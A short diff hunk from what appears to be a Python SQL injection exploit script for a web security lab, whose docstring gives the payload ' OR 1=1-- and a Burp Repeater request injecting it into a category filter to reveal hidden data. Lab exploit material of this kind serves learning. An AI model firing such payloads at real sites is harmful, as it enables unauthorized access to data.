@@ -16,7 +16,7 @@ SQLi exploit script used to retrieve hidden data.
 paylod used in Burp Repeater
 ' OR 1=1--
 GET /filter?category=Accessories'+OR+1%3d1--
-running the exploit/script will look like this:
+
 """
 import requests
 import sys
